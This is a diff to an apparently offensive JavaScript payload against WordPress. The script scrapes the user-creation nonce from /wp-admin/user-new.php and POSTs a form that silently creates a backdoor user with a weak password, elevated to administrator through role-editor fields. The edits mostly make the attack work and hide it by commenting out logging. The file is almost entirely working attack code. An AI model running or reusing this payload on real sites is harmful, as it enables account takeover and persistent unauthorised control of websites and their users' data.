@@ -42,52 +42,52 @@ function read_body(xhr) {
 
 function sendAddUserPost(nonce)
 {
+	// The following user will be added as an Administrator level user
 	var uri       = "/wp-admin/user-new.php";
-	var username  = "badguy222";
-	var email     = "badguyforrealz@bad.af"
-	var firstName = "bobby";
-	var lastName  = "phenanana";
+	var username  = "ishouldntbehere";
+	var email     = "advancedadmin%40bad.af"
+	var firstName = "trevor";
+	var lastName  = "roach";
 	var password  = "toor";
 
-	console.log("Starting addUser...");
-	console.log("In addUser, nonce value is: " + nonce);
+//	console.log("Starting addUser...");
+//	console.log("In addUser, nonce value is: " + nonce);
 
 	xhr = new XMLHttpRequest();
 	xhr.open("POST", uri);
+	// Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+ 	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+ 	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 	var body = "action=createuser&"
-/*
-	var formData = new FormData();
-	formData.append("action", "createuser");
-	formData.append("_wpnonce_create-user", nonce);  // /giphy magic
-	formData.append("_wp_http_referer", "%2Fwp-admin%2Fuser-new.php");
-	formData.append("user_login", username);
-	formData.append("email", email);
-	formData.append("first_name", firstName);
-	formData.append("last_name", lastName);
-	formData.append("uri", "");
-	formData.append("pass1", password);
-	formData.append("pass1-text", password);
-	formData.append("pass2", password);
-	formData.append("pw_weak", "on");
-	formData.append("send_user_notification", "0");
-	formData.append("role", "subscriber");
-	formData.append("ure_select_other_roles", "administrator"); // oh yeah baby
-	formData.append("ure_other_roles", "administrator"); // Ummph ummph ummph
-	formData.append("createuser", "Add New User");
+	body += "_wpnonce_create-user=" + nonce + "&"; 
+	body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
+	body += "user_login=" + username + "&";
+	body += "email=" + email + "&";
+	body += "first_name=" + firstName + "&";
+	body += "last_name=" + lastName + "&";
+	body += "uri=&";
+	body += "pass1=" + password + "&";
+	body += "pass1-text=" + password + "&";
+	body += "pass2=" + password + "&";
+	body += "pw_weak=on&";
+	body += "send_user_notification=0&";
+	body += "role=subscriber&";
+	body += "ure_select_other_roles=administrator&"; // muahahahaha 
+	body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
+	body += "createuser=Add+New+User";
 
-	 xhr.send(formData);
-*/
+	xhr.send(body);
 
-
-	 console.log("Done adding new user: " + username);
+	//console.log("Done adding new user: " + username);
 }
 
 
 // Parse out the nonce value then pass to the add user function
-function getAddUserNonce()
+function getNonceAndAddUser()
 {
-	console.log("Starting getNonce...");
+	// console.log("Starting getNonce...");
 
 
 	var uri = "/wp-admin/user-new.php";
@@ -104,15 +104,13 @@ function getAddUserNonce()
 		{
 			var response = read_body(xhr);
 			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
-			console.log("Nonce position: " + noncePos);
+		//	console.log("Nonce position: " + noncePos);
 
 			var nonceVal = response.substring(noncePos+35, noncePos+45);
 
-			console.log("Inner Nonce value: " + nonceVal);
+		//	console.log("Inner Nonce value: " + nonceVal);
 
 			sendAddUserPost(nonceVal);
-			// "_wpnonce_create-user" value="
-			// 537b80b191
 		}
 	}
 
@@ -122,6 +120,6 @@ function getAddUserNonce()
 
 
 
-// This needs 
-getAddUserNonce();
-//addUser();
+// This needs cleanup
+getNonceAndAddUser();
+
